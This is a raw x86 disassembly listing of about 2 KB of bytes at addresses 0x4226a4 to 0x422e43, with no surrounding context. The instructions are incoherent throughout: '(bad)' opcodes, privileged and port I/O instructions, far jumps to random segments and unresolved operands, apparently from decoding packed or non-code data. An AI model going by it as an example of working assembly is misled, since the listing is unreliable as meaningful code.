  4226a4:	add    ecx,DWORD PTR [edi+0x54782595]
  4226aa:	lods   al,BYTE PTR ds:[esi]
  4226ab:	out    dx,eax
  4226ac:	not    DWORD PTR [edi+0x544ac81b]
  4226b2:	pop    eax
  4226b3:	jge    0x422669
  4226b5:	popa   
  4226b6:	jnp    0x42263e
  4226b8:	mov    al,dh
  4226ba:	mov    ebp,0xbbe37b25
  4226bf:	and    DWORD PTR [ebx+0x69],eax
  4226c2:	or     eax,esi
  4226c4:	mul    DWORD PTR [esi]
  4226c6:	push   ecx
  4226c7:	xchg   edi,eax
  4226c8:	(bad)  
  4226c9:	pusha  
  4226ca:	popf   
  4226cb:	pop    edx
  4226cc:	jnp    0x422668
  4226ce:	add    BYTE PTR [eax],0xf4
  4226d1:	jmp    0xb6c1:0xf245fa97
  4226d8:	pop    edi
  4226d9:	leave  
  4226da:	mov    ecx,0xfc8a2af2
  4226df:	mov    dh,0x35
  4226e1:	mov    edx,0x1647c742
  4226e6:	call   0xbe4ae288
  4226eb:	cld    
  4226ec:	shl    dh,1
  4226ee:	outs   dx,BYTE PTR ds:[esi]
  4226ef:	dec    esi
  4226f0:	gs pop es
  4226f2:	jle    0x42269a
  4226f4:	mov    ah,0x84
  4226f6:	(bad)  
  4226f7:	imul   edi,edi,0xfffffffe
  4226fa:	into   
  4226fb:	sub    cl,bl
  4226fd:	ficomp DWORD PTR [ecx-0x8]
  422700:	mov    edx,0xb092308e
  422705:	nop
  422706:	(bad)  
  422707:	scas   al,BYTE PTR es:[edi]
  422708:	xor    DWORD PTR [eax+0x76164ee7],ebp
  42270e:	xchg   DWORD PTR [esi],edi
  422710:	and    eax,0xe3819bd7
  422715:	shr    DWORD PTR fs:[esi+edx*8],cl
  422719:	cmc    
  42271a:	in     eax,0xba
  42271c:	loope  0x4226e7
  42271e:	das    
  42271f:	cmp    ecx,DWORD PTR [esi-0x5a]
  422722:	shl    DWORD PTR [edx],cl
  422724:	pop    ebx
  422725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422726:	imul   esp,DWORD PTR [eax+0x4c71bf86],0xd1ee7ac3
  422730:	int    0xe4
  422732:	call   0x403a6b4f
  422737:	jmp    0x51ae40e5
  42273c:	popa   
  42273d:	mov    al,0x6e
  42273f:	lock test BYTE PTR [edi-0x1b801255],0x27
  422747:	arpl   WORD PTR ds:0xd215c555,sp
  42274d:	pop    esi
  42274e:	push   eax
  42274f:	sbb    al,0xb1
  422751:	outs   dx,DWORD PTR ds:[esi]
  422752:	scas   al,BYTE PTR es:[edi]
  422753:	inc    edx
  422754:	xchg   esi,eax
  422755:	test   BYTE PTR [ecx+0x30705da5],dl
  42275b:	adc    ch,ah
  42275d:	jbe    0x4227d6
  42275f:	repz popa 
  422761:	dec    ebx
  422762:	xor    BYTE PTR [esi],0x4d
  422765:	(bad)  
  422767:	adc    BYTE PTR [ebp+ebx*2-0x3],dh
  42276b:	neg    DWORD PTR [edx]
  42276d:	retf   0xf143
  422770:	(bad)  
  422771:	std    
  422772:	fimul  WORD PTR [esi-0xe2561ca]
  422778:	jmp    0x104e:0x113ac81f
  42277f:	mov    esi,0x3e2832e5
  422784:	dec    edi
  422785:	aad    0x4c
  422787:	and    BYTE PTR [esi],bl
  422789:	lahf   
  42278a:	daa    
  42278b:	mov    cl,0x4d
  42278d:	sti    
  42278e:	call   0x1230f8ac
  422793:	dec    ebp
  422794:	push   esi
  422795:	push   ebp
  422796:	add    BYTE PTR [eax-0x74],al
  422799:	ss bnd jns 0x422809
  42279d:	mov    al,0x43
  42279f:	push   0xbb43a373
  4227a4:	(bad)  
  4227a5:	test   BYTE PTR [ebp-0x70],0xbe
  4227a9:	mov    bl,0x5
  4227ab:	and    DWORD PTR [esi+0x7e],ebx
  4227ae:	adc    al,BYTE PTR [ebx+0xb]
  4227b1:	mov    ecx,0x8e409640
  4227b6:	add    eax,0x13e4efa6
  4227bb:	sbb    ecx,DWORD PTR ds:0x5361b596
  4227c1:	fmul   QWORD PTR [esi+edx*8-0x79]
  4227c5:	(bad)  
  4227c7:	mov    ah,BYTE PTR [edi]
  4227c9:	push   esi
  4227ca:	pop    esi
  4227cb:	adc    BYTE PTR [esi-0xd],cl
  4227ce:	mov    eax,ds:0xad6ee49
  4227d3:	push   es
  4227d4:	jbe    0x422759
  4227d6:	xor    eax,ebx
  4227d8:	cdq    
  4227d9:	stos   DWORD PTR es:[edi],eax
  4227da:	loope  0x42280e
  4227dc:	imul   ebx,DWORD PTR [eax+0x5],0xffffffe4
  4227e0:	push   0x37
  4227e2:	xchg   esp,eax
  4227e3:	mov    esi,0xa01b63d3
  4227e8:	in     al,0xc1
  4227ea:	aam    0x61
  4227ec:	fst    DWORD PTR [esi+0x33caa5db]
  4227f2:	inc    esp
  4227f3:	ret    0x45ad
  4227f6:	mul    DWORD PTR [esi+0x10d24997]
  4227fc:	dec    ecx
  4227fd:	jo     0x422816
  4227ff:	ins    DWORD PTR es:[edi],dx
  422800:	xchg   ebx,eax
  422801:	enter  0x142e,0x1e
  422805:	retf   0x59b7
  422808:	loope  0x42285c
  42280a:	push   0xfffffff9
  42280c:	nop
  42280d:	nop    DWORD PTR [edi]
  422810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422811:	xchg   esi,eax
  422812:	fadd   DWORD PTR [ecx-0x22]
  422815:	cli    
  422816:	lods   eax,DWORD PTR ds:[esi]
  422817:	xchg   DWORD PTR cs:[ebx-0x2a],ebx
  42281b:	fcomi  st,st(6)
  42281d:	repz shl esp,cl
  422820:	cdq    
  422821:	or     BYTE PTR [edi-0x6f],bh
  422824:	ds push esi
  422826:	push   esp
  422827:	xor    dl,ah
  422829:	test   al,0xa5
  42282c:	mov    al,0x62
  42282e:	xchg   edi,eax
  42282f:	mov    ds:0x6b3a4678,eax
  422834:	(bad)  
  422835:	neg    DWORD PTR [ecx-0x30]
  422838:	or     al,0x3
  42283a:	sbb    DWORD PTR [ebp-0x1],0xffffff93
  42283e:	stos   DWORD PTR es:[edi],eax
  42283f:	fidiv  WORD PTR [edi-0x7c]
  422842:	fwait
  422843:	dec    esp
  422844:	sub    al,0x5d
  422846:	imul   eax,edx,0xeadb87c0
  42284c:	mov    ebx,0xa2fa02c6
  422851:	ret    
  422852:	ins    BYTE PTR es:[edi],dx
  422853:	ja     0x4227ef
  422855:	pop    es
  422856:	es dec esp
  422858:	xor    eax,0xe3a4c5d7
  42285d:	xchg   BYTE PTR [eax+0xc],cl
  422860:	mov    cl,0x4
  422862:	cs mov edi,0x1d45afcc
  422868:	loope  0x42286a
  42286a:	sbb    DWORD PTR [esi],ebx
  42286c:	shr    cl,1
  42286e:	(bad)  
  42286f:	jmp    0x422826
  422871:	sahf   
  422872:	(bad)  
  422873:	(bad)  
  422875:	icebp  
  422876:	(bad)  
  422877:	fld    st(6)
  422879:	inc    edx
  42287a:	xchg   esi,eax
  42287b:	dec    ebx
  42287c:	push   0x994f58b4
  422881:	shl    BYTE PTR [ebx-0x4],1
  422884:	lea    ecx,gs:[ebx-0x1b9a128d]
  42288b:	cmp    al,0x2
  42288d:	inc    ecx
  42288e:	or     al,0x85
  422890:	or     BYTE PTR [eax-0x7f],0x38
  422894:	cmc    
  422895:	imul   esp,ecx,0xffffffc9
  422898:	int3   
  422899:	cli    
  42289a:	cld    
  42289b:	adc    ebp,DWORD PTR [ebx-0x2f]
  42289e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42289f:	(bad)  [edi]
  4228a1:	add    dh,BYTE PTR [eax-0x3cee4b1d]
  4228a7:	dec    ebx
  4228a8:	xor    esp,0xffffffb2
  4228ab:	gs (bad) 
  4228ae:	jns    0x422874
  4228b0:	sub    al,0xc
  4228b2:	data16 aas 
  4228b4:	jnp    0x42286f
  4228b6:	adc    al,0x82
  4228b8:	pop    esi
  4228b9:	sar    bh,cl
  4228bb:	push   ebx
  4228bc:	mov    bh,0xcd
  4228be:	outs   dx,BYTE PTR ds:[esi]
  4228bf:	cmp    al,0x33
  4228c2:	and    bh,dh
  4228c4:	mov    eax,ds:0xccfa6d50
  4228c9:	(bad)  
  4228ca:	icebp  
  4228cb:	and    al,BYTE PTR ss:[ebx]
  4228ce:	pusha  
  4228cf:	into   
  4228d0:	and    dh,BYTE PTR [ecx-0x4e]
  4228d3:	dec    ebx
  4228d4:	add    BYTE PTR [edi],bh
  4228d6:	sbb    BYTE PTR [edi],bl
  4228d8:	(bad)  
  4228d9:	jbe    0x422876
  4228db:	cli    
  4228dc:	xchg   ecx,eax
  4228dd:	mov    BYTE PTR [eax],cl
  4228df:	retf   
  4228e0:	pop    eax
  4228e1:	pop    edi
  4228e2:	imul   ebp,DWORD PTR [edi+0x16e9be91],0x1293ac58
  4228ec:	push   eax
  4228ed:	call   0xa2b31c8d
  4228f2:	std    
  4228f3:	ins    DWORD PTR es:[edi],dx
  4228f4:	std    
  4228f5:	push   ebp
  4228f6:	fcom   QWORD PTR [edx+ecx*1+0x63a84148]
  4228fd:	xor    eax,DWORD PTR [esp+ebx*4+0x60]
  422901:	inc    eax
  422902:	pop    ecx
  422903:	push   edx
  422904:	je     0x4228b3
  422906:	jg     0x422955
  422908:	mov    al,ds:0xf2cef06b
  42290d:	cmp    al,0xc1
  42290f:	ins    DWORD PTR es:[edi],dx
  422910:	jae    0x422912
  422912:	mov    edi,0x9a05a842
  422917:	mov    edx,esi
  422919:	pop    ebx
  42291a:	cmp    al,ch
  42291c:	arpl   WORD PTR [ebx+0x22],bp
  42291f:	lods   al,BYTE PTR ds:[esi]
  422920:	cmc    
  422921:	cld    
  422922:	gs lock xchg edi,eax
  422925:	pop    eax
  422926:	out    dx,al
  422927:	pop    ds
  422928:	inc    eax
  422929:	mov    ebx,0xdc49ec39
  42292e:	mov    eax,ds:0x9ec42986
  422933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422934:	call   0xbd45:0xa741223c
  42293b:	cld    
  42293c:	sub    al,0xa2
  42293e:	cwde   
	...
  422947:	add    BYTE PTR [eax],al
  422949:	add    BYTE PTR [eax+0x50],cl
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	ret    0x96de
  422959:	retf   0xb7b5
  42295c:	add    DWORD PTR [eax],eax
  42295e:	jge    0x422966
  422960:	add    BYTE PTR [eax],al
  422962:	add    BYTE PTR [eax],ch
  422964:	xchg   esi,eax
  422965:	cmp    ch,dl
  422967:	push   ecx
  422968:	adc    al,0x69
  42296a:	xchg   esi,eax
  42296b:	inc    ecx
  42296c:	adc    ebx,esi
  42296e:	jae    0x422977
  422970:	ficom  WORD PTR [edx+edi*4+0x4df1e4b2]
  422977:	jmp    0x4229b6
  422979:	je     0x42293c
  42297b:	lea    esi,[ebx-0x18]
  42297e:	pop    es
  42297f:	lea    edi,[ebp-0x41ea4372]
  422985:	xor    eax,0x40f8a1c2
  42298a:	outs   dx,BYTE PTR ds:[esi]
  42298b:	idiv   DWORD PTR [ebp+edx*8-0x7cbfffda]
  422992:	mov    ds:0x41858e82,al
  422997:	mov    eax,ds:0x6e61246
  42299c:	adc    al,0xc3
  42299e:	xchg   eax,edx
  4229a0:	imul   ecx,DWORD PTR [edi],0xf054f12a
  4229a6:	pop    es
  4229a7:	mov    ecx,?
  4229a9:	(bad)  
  4229aa:	cld    
  4229ab:	sbb    esp,esp
  4229ad:	mov    ds:0xe8880ce2,eax
  4229b2:	add    al,0xca
  4229b4:	mov    esp,DWORD PTR [ebp+0x3e]
  4229b7:	inc    esp
  4229b8:	addr16 call 0xd9319cc7
  4229be:	ror    bh,cl
  4229c0:	sub    esi,DWORD PTR [eax+ebp*8-0x72]
  4229c4:	inc    edi
  4229c5:	push   cs
  4229c6:	sbb    BYTE PTR ds:0x4cb2d6b,0x8b
  4229cd:	das    
  4229ce:	push   0xcd3cf1eb
  4229d3:	inc    eax
  4229d4:	loope  0x422977
  4229d6:	ss ud0 esi,esp
  4229da:	pop    ds
  4229db:	daa    
  4229dc:	stos   DWORD PTR es:[edi],eax
  4229dd:	mov    ds:0xcd2d9049,al
  4229e2:	pop    edx
  4229e3:	sub    BYTE PTR [edx-0x5d],0xd4
  4229e7:	mov    WORD PTR [edi-0x17b08ced],cs
  4229ed:	jg     0x4229c9
  4229ef:	push   eax
  4229f0:	xchg   ebp,eax
  4229f1:	ins    BYTE PTR es:[edi],dx
  4229f2:	imul   eax,DWORD PTR [ebx+ebp*1],0x455b19e8
  4229f9:	mov    dh,0x9a
  4229fb:	xchg   edx,eax
  4229fc:	add    ebx,DWORD PTR [esi]
  4229fe:	jmp    0x4b6d:0xf30ae4e7
  422a05:	mov    ch,0xfb
  422a07:	sbb    al,0x62
  422a09:	shl    DWORD PTR [edi-0x7d],cl
  422a0c:	mov    ds:0xbd6e4e5,eax
  422a11:	mov    esi,0x183a5ff4
  422a16:	cli    
  422a17:	mov    esi,0x4bd5f552
  422a1c:	cmc    
  422a1d:	outs   dx,BYTE PTR ds:[esi]
  422a1e:	dec    edi
  422a1f:	dec    esi
  422a20:	and    DWORD PTR [edx*4+0x18428ae3],esp
  422a27:	icebp  
  422a28:	inc    esp
  422a29:	rcr    DWORD PTR [edx],0xa
  422a2c:	cmc    
  422a2d:	mov    al,0xc7
  422a2f:	fs test eax,0x14ebdd4d
  422a35:	jmp    FWORD PTR [ebx]
  422a37:	mov    esp,0xac1cd12
  422a3c:	arpl   WORD PTR [eax],dx
  422a3e:	dec    esp
  422a3f:	or     DWORD PTR [ebx],0x30519720
  422a45:	jbe    0x422a1f
  422a47:	ss inc esp
  422a49:	inc    edi
  422a4a:	mov    BYTE PTR [ebx+0xd],dh
  422a4d:	jmp    0xb39217b1
  422a52:	cmp    esi,ebp
  422a54:	lods   al,BYTE PTR ds:[esi]
  422a55:	jmp    0xd5872e3a
  422a5a:	in     eax,dx
  422a5b:	adc    al,0x6e
  422a5d:	dec    esi
  422a5e:	and    BYTE PTR [ecx],dl
  422a60:	mov    edx,0x1a66c325
  422a65:	or     DWORD PTR [esi-0x512b68e9],ecx
  422a6b:	in     al,dx
  422a6c:	and    eax,0x183e313f
  422a71:	adc    DWORD PTR [ebp+0x6f68ccff],0x7e36316f
  422a7b:	int    0x4
  422a7d:	push   esp
  422a7e:	les    esi,FWORD PTR [edi]
  422a80:	cmp    DWORD PTR [ecx-0x5d],edx
  422a83:	adc    dh,ch
  422a85:	cmp    DWORD PTR [eax+eiz*8],edi
  422a88:	xor    ch,ah
  422a8a:	adc    eax,0x28312748
  422a8f:	jae    0x422a4e
  422a91:	dec    ebx
  422a92:	add    edi,DWORD PTR [ecx]
  422a94:	lods   eax,DWORD PTR ds:[esi]
  422a95:	xchg   esi,eax
  422a96:	test   DWORD PTR [esi+0x2a],eax
  422a99:	jecxz  0x422ad6
  422a9b:	stos   DWORD PTR es:[edi],eax
  422a9c:	retf   0xd2d4
  422a9f:	add    ebx,edi
  422aa1:	and    al,0x29
  422aa3:	ror    DWORD PTR [ecx-0x16],0xf3
  422aa7:	enter  0xeae3,0xbb
  422aab:	or     ah,BYTE PTR [edx-0x40]
  422aae:	sub    ecx,DWORD PTR [edx-0x611eb86d]
  422ab4:	mov    BYTE PTR [ecx],bh
  422ab6:	out    dx,al
  422ab7:	jge    0x422ab3
  422ab9:	inc    ebp
  422aba:	sahf   
  422abb:	push   esi
  422abc:	push   edx
  422abd:	and    BYTE PTR [ecx],cl
  422abf:	fsub   st(1),st
  422ac1:	jg     0x422a8f
  422ac3:	pop    esp
  422ac4:	je     0x422a62
  422ac6:	jae    0x422b23
  422ac8:	cdq    
  422ac9:	and    BYTE PTR [esi+0xd],al
  422acc:	or     edx,eax
  422ace:	iret   
  422acf:	fsubr  QWORD PTR [ebp+0x4f4ab785]
  422ad5:	mov    esp,0x21720667
  422ada:	hlt    
  422adb:	xor    al,0xf7
  422add:	jmp    0x617f:0x9b07b423
  422ae4:	imul   ebp,DWORD PTR [edx+0x53],0x48780db7
  422aeb:	imul   edx,DWORD PTR [edx+eax*2-0x25027b63],0x712c5317
  422af6:	jmp    DWORD PTR [ecx+0x4b]
  422af9:	sbb    bl,BYTE PTR [edx-0x9058c0f]
  422aff:	scas   al,BYTE PTR es:[edi]
  422b00:	(bad)  
  422b01:	or     DWORD PTR [ecx+0x56b55d1d],eax
  422b07:	cmp    al,0x43
  422b09:	xchg   edx,eax
  422b0a:	or     ebx,eax
  422b0c:	ins    BYTE PTR es:[edi],dx
  422b0d:	shr    bl,0x59
  422b10:	or     al,BYTE PTR [ebp+0x9]
  422b13:	xchg   ebp,eax
  422b14:	pop    ecx
  422b15:	popa   
  422b16:	syscall 
  422b18:	nop
  422b19:	dec    esp
  422b1a:	js     0x422afd
  422b1c:	adc    al,0xb9
  422b1e:	adc    DWORD PTR [esi+0x3f],eax
  422b21:	pop    ebx
  422b22:	mov    ds:0x19bb1841,al
  422b27:	or     dl,cl
  422b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b2a:	mov    edx,0x7c501a70
  422b2f:	icebp  
  422b30:	out    dx,eax
  422b31:	retf   0xea1
  422b34:	iret   
  422b35:	fisubr DWORD PTR [eax+0x48f598e2]
  422b3b:	mov    eax,0x3450507f
  422b40:	mov    dh,0x16
  422b42:	repnz xlat BYTE PTR ds:[ebx]
  422b44:	dec    ebp
  422b45:	js     0x422b27
  422b47:	push   0x3e
  422b49:	in     eax,0xb
  422b4b:	mov    ecx,0xddb26751
  422b50:	jne    0x422ad4
  422b52:	lahf   
  422b53:	fild   DWORD PTR [eax]
  422b55:	jb     0x422ba8
  422b57:	outs   dx,BYTE PTR ds:[esi]
  422b58:	aas    
  422b59:	mov    edi,DWORD PTR [eax-0x1425bb85]
  422b5f:	xor    eax,eax
  422b61:	jno    0x422af9
  422b63:	mov    ah,0x10
  422b65:	imul   ebp,DWORD PTR [ebp+0x51],0xed46a02b
  422b6c:	adc    BYTE PTR [esi+0x67],al
  422b6f:	(bad)  
  422b70:	sbb    DWORD PTR [esi+ebx*8+0x7bf92dc7],esp
  422b77:	pusha  
  422b78:	js     0x422b86
  422b7a:	and    eax,0x659dfa4e
  422b7f:	pushf  
  422b80:	(bad)  
  422b81:	neg    DWORD PTR [ebx+0x93430e5]
  422b87:	jno    0x422b93
  422b89:	jns    0x422c02
  422b8b:	ret    
  422b8c:	popa   
  422b8d:	pop    esi
  422b8e:	loop   0x422bba
  422b90:	mov    ch,0xc4
  422b92:	pop    es
  422b93:	xchg   ebp,eax
  422b94:	mov    ch,dl
  422b96:	cmp    ebx,esp
  422b98:	jae    0x422b87
  422b9a:	inc    edx
  422b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b9c:	imul   ebp,DWORD PTR [esi],0xffffff8b
  422b9f:	ins    DWORD PTR es:[edi],dx
  422ba0:	mov    edi,0x2fe21418
  422ba5:	hlt    
  422ba6:	or     al,0x69
  422ba8:	xor    BYTE PTR [eax],bl
  422baa:	xchg   ebx,eax
  422bab:	fdiv   DWORD PTR [eax]
  422bad:	jns    0x422c1e
  422baf:	out    0xe5,al
  422bb1:	sbb    al,0x68
  422bb3:	psrlw  mm1,QWORD PTR [ebx-0x1d5e7da6]
  422bba:	mov    BYTE PTR [edi],bh
  422bbc:	dec    ebx
  422bbd:	mov    bl,0x77
  422bbf:	shl    bl,1
  422bc1:	fstp   QWORD PTR [ecx+0x2f9df18e]
  422bc7:	es mov ah,0x7c
  422bca:	xor    BYTE PTR [esi],al
  422bcc:	aam    0xa3
  422bce:	dec    eax
  422bcf:	pop    ds
  422bd0:	sbb    ebx,ebx
  422bd2:	dec    edi
  422bd3:	sbb    DWORD PTR [ebx-0x42],ecx
  422bd6:	or     DWORD PTR [eax-0x36],edi
  422bd9:	dec    esp
  422bda:	xchg   ebx,eax
  422bdb:	add    eax,0xe65a9b9d
  422be0:	mov    cl,bh
  422be2:	mov    cl,0xf4
  422be4:	mov    WORD PTR [eax+0x1d],?
  422be7:	jno    0x422bb8
  422be9:	adc    ebp,edx
  422beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bec:	aaa    
  422bed:	aad    0x62
  422bef:	pop    esi
  422bf0:	loopne 0x422c52
  422bf2:	and    eax,0x6e5af300
  422bf7:	pop    ds
  422bf8:	sbb    BYTE PTR [eax+ebp*4-0x21],bh
  422bfc:	lods   eax,DWORD PTR ds:[esi]
  422bfd:	enter  0x4778,0xc
  422c01:	cs call 0xc8f5:0xf6ecbfbd
  422c09:	pop    ebp
  422c0a:	cmp    BYTE PTR [ecx+ebx*1+0x16],cl
  422c0e:	push   edx
  422c0f:	pop    ds
  422c10:	int3   
  422c11:	xchg   edx,eax
  422c12:	or     al,0x0
  422c14:	pop    edx
  422c15:	sub    ebx,esp
  422c17:	jmp    0x733f51e9
  422c1c:	jecxz  0x422baa
  422c1e:	pusha  
  422c1f:	addr16 ret 
  422c21:	dec    esp
  422c22:	add    dl,BYTE PTR [eax-0x4c1b2d13]
  422c28:	mov    ch,0xfe
  422c2a:	aas    
  422c2b:	mov    bh,0xc7
  422c2d:	jmp    0x422c7f
  422c2f:	mov    al,ds:0x75af7d13
  422c34:	out    0xf7,eax
  422c36:	jecxz  0x422c65
  422c38:	mov    bh,0x15
  422c3a:	mov    edx,0xdaf6658d
  422c3f:	jmp    0xb1c3f3ed
  422c44:	pop    ds
  422c45:	or     bh,BYTE PTR [eax+0x1c]
  422c48:	call   0x65bf7c14
  422c4d:	retf   
  422c4e:	jle    0x422bfb
  422c50:	mov    dl,0x10
  422c52:	sahf   
  422c53:	shl    ah,0xe9
  422c56:	jb     0x422c1e
  422c58:	sbb    ebp,DWORD PTR [ecx]
  422c5a:	cmp    BYTE PTR [ebp-0x64],0x2c
  422c5e:	inc    esp
  422c5f:	add    edi,DWORD PTR [ebx]
  422c61:	aad    0x80
  422c63:	popa   
  422c64:	daa    
  422c65:	fidiv  WORD PTR [esp+ebp*8-0x6c1c1d24]
  422c6c:	into   
  422c6d:	aas    
  422c6e:	or     al,0x76
  422c70:	scas   al,BYTE PTR es:[edi]
  422c71:	xor    al,0x61
  422c73:	leave  
  422c74:	xor    ebx,edi
  422c76:	jmp    0x53b:0x67ec6284
  422c7d:	loopne 0x422c72
  422c7f:	adc    BYTE PTR [ebx+0x5ef2465b],bh
  422c85:	add    cl,BYTE PTR [ebp+0x3f]
  422c88:	lods   al,BYTE PTR ds:[esi]
  422c89:	dec    esp
  422c8a:	les    esp,FWORD PTR [eax+0x56]
  422c8d:	pushf  
  422c8e:	pop    ss
  422c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c90:	retf   
  422c91:	popf   
  422c92:	icebp  
  422c93:	(bad)  
  422c94:	adc    DWORD PTR [edx+0x72cc00f6],ebx
  422c9a:	sub    BYTE PTR [ebp-0x34d5b114],dl
  422ca0:	loope  0x422c67
  422ca2:	lahf   
  422ca3:	(bad)  
  422ca4:	aaa    
  422ca5:	lock pusha 
  422ca7:	inc    ecx
  422ca8:	shl    dl,0xab
  422cab:	call   0x98bab5df
  422cb0:	sub    eax,0xfce74ced
  422cb5:	mov    ah,BYTE PTR [ebx*4-0x2895b8c8]
  422cbc:	sub    BYTE PTR [ebp+0x3a29c4ad],0x98
  422cc3:	adc    DWORD PTR [esi],esp
  422cc5:	sti    
  422cc6:	or     al,0x37
  422cc8:	fwait
  422cc9:	leave  
  422cca:	mov    eax,ds:0x29977cd4
  422ccf:	mov    bl,BYTE PTR [ebx]
  422cd1:	(bad)  
  422cd2:	fidivr WORD PTR [ebp-0x6bc39b9f]
  422cd8:	cmp    ebx,DWORD PTR [edi-0x531e02de]
  422cde:	sub    dh,ch
  422ce0:	nop
  422ce1:	in     eax,0xf5
  422ce3:	dec    edx
  422ce4:	mov    al,BYTE PTR [esi-0x69e06b97]
  422cea:	push   es
  422ceb:	es jl  0x422cb0
  422cee:	inc    ebx
  422cef:	push   edx
  422cf0:	mov    ?,WORD PTR [ecx*8+0x5e646e05]
  422cf7:	stos   DWORD PTR es:[edi],eax
  422cf8:	mov    dh,0x89
  422cfa:	jnp    0x422d1d
  422cfc:	aas    
  422cfd:	lds    ebx,FWORD PTR [ebx+0x75]
  422d00:	mov    al,BYTE PTR [ecx]
  422d02:	cmp    eax,0xbeea4ab2
  422d07:	outs   dx,DWORD PTR ds:[esi]
  422d08:	xchg   esp,eax
  422d09:	mov    ch,0xc2
  422d0b:	inc    ebp
  422d0c:	lods   eax,DWORD PTR ds:[esi]
  422d0d:	es dec ecx
  422d0f:	sub    DWORD PTR [ebx-0x2],0xae8686be
  422d16:	mov    esi,0x4af115fe
  422d1b:	repz and DWORD PTR ds:0x9948e0c8,ebp
  422d22:	dec    ebx
  422d23:	sbb    esp,DWORD PTR [esi+ecx*2-0x39a779e5]
  422d2a:	ror    DWORD PTR [ecx+edx*8-0x35],0x46
  422d2f:	loop   0x422cf6
  422d31:	xor    BYTE PTR gs:[esi],dh
  422d34:	adc    eax,0x2ea99a08
  422d39:	cmp    DWORD PTR [edx],ecx
  422d3b:	in     al,dx
  422d3c:	dec    ebx
  422d3d:	ret    
  422d3e:	push   0x8b9ef650
  422d43:	mov    dl,0x43
  422d45:	pop    ss
  422d46:	inc    ebp
  422d47:	dec    edx
  422d48:	dec    ebp
  422d49:	sub    al,BYTE PTR [edx+0x70]
  422d4c:	jmp    0x9ed8ac3a
  422d51:	cmc    
  422d52:	cmp    DWORD PTR [esi],0x43
  422d55:	xlat   BYTE PTR ds:[ebx]
  422d56:	jle    0x422dce
  422d58:	mov    bh,0x6
  422d5a:	inc    esp
  422d5b:	mov    dh,0x72
  422d5d:	push   ecx
  422d5e:	push   edi
  422d5f:	adc    ebp,ecx
  422d61:	ja     0x422cf8
  422d63:	lods   eax,DWORD PTR ds:[esi]
  422d64:	cli    
  422d65:	jns    0x422d19
  422d67:	in     eax,0x4b
  422d69:	xchg   ecx,eax
  422d6a:	jecxz  0x422d8c
  422d6c:	test   eax,0x10cdefcd
  422d71:	scas   al,BYTE PTR es:[edi]
  422d72:	cli    
  422d73:	push   cs
  422d74:	lods   eax,DWORD PTR ds:[esi]
  422d75:	mov    esi,0x716f5e5f
  422d7a:	loope  0x422dfa
  422d7c:	pop    esi
  422d7d:	sub    DWORD PTR [edx-0x4ba1e189],ecx
  422d83:	adc    edx,DWORD PTR [edi+ecx*1-0x77]
  422d87:	push   esp
  422d88:	iret   
  422d89:	dec    eax
  422d8a:	jl     0x422d0c
  422d8c:	imul   BYTE PTR [ecx+0x69bdcc2d]
  422d92:	ror    DWORD PTR [edi+edx*2],1
  422d95:	in     eax,0x85
  422d97:	mov    ecx,0xb959e322
  422d9c:	les    esp,FWORD PTR [edx]
  422d9e:	cmp    dl,BYTE PTR [ecx-0x4e0782a9]
  422da4:	push   cs
  422da5:	adc    ebx,DWORD PTR [edx]
  422da7:	enter  0xaa62,0xfa
  422dab:	fld    TBYTE PTR [ebp-0x2f]
  422dae:	and    al,cl
  422db0:	sub    edi,DWORD PTR [ebp-0x61607a1f]
  422db6:	or     dl,BYTE PTR [esi-0x7a2d2f89]
  422dbc:	pop    ebp
  422dbd:	xor    dl,BYTE PTR [ecx]
  422dbf:	mov    gs,WORD PTR [esi]
  422dc1:	dec    esp
  422dc2:	xchg   ebp,eax
  422dc3:	out    dx,eax
  422dc4:	cmp    ecx,DWORD PTR [edx-0x6f6f470c]
  422dca:	test   DWORD PTR [ebx+0x5c9b3d55],eax
  422dd0:	jg     0x422db8
  422dd2:	xlat   BYTE PTR ds:[ebx]
  422dd3:	icebp  
  422dd4:	push   es
  422dd5:	cmp    DWORD PTR [ebp+0x4e],esp
  422dd8:	inc    ebp
  422dd9:	cmp    BYTE PTR [edi+edi*8+0x6d44a3ae],0x56
  422de1:	sbb    BYTE PTR [esi+0x2faecc44],0xc7
  422de8:	aad    0xed
  422dea:	sbb    edx,edx
  422dec:	cld    
  422ded:	int    0x41
  422def:	lods   al,BYTE PTR ds:[esi]
  422df0:	les    ecx,FWORD PTR [ecx]
  422df2:	sub    dh,cl
  422df4:	nop
  422df5:	xor    al,BYTE PTR [ecx]
  422df7:	cmp    edx,esp
  422df9:	or     DWORD PTR [eax+edx*8-0x2a],0xb936ae2f
  422e01:	and    cl,BYTE PTR [ecx]
  422e03:	sub    eax,DWORD PTR ds:0xedc0841c
  422e09:	dec    ecx
  422e0a:	and    al,BYTE PTR [esi+0x53]
  422e0d:	fnstenv [ebp+0x42]
  422e10:	sub    bl,BYTE PTR [ebx+0x46]
  422e13:	je     0x422e5a
  422e15:	scas   eax,DWORD PTR es:[edi]
  422e16:	scas   eax,DWORD PTR es:[edi]
  422e17:	cmp    eax,0xe0625b78
  422e1c:	sbb    DWORD PTR [ecx-0xa],esi
  422e1f:	mov    bl,0x3b
  422e21:	inc    ebp
  422e22:	push   cs
  422e23:	xor    dl,dl
  422e25:	out    dx,al
  422e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e27:	fsubr  DWORD PTR [edi]
  422e29:	mov    al,ds:0xec1c98f6
  422e2e:	push   esp
  422e2f:	mov    dl,0x42
  422e31:	outs   dx,DWORD PTR ds:[esi]
  422e32:	and    edx,edx
  422e34:	in     eax,dx
  422e35:	hlt    
  422e36:	into   
  422e37:	sbb    edi,DWORD PTR [ecx]
  422e39:	es jecxz 0x422e6d
  422e3c:	cdq    
  422e3d:	scas   eax,DWORD PTR es:[edi]
  422e3e:	ficomp WORD PTR [esi+0x8]
  422e41:	dec    eax
  422e42:	into   
  422e43:	cmp    eax,0xa84d93f9
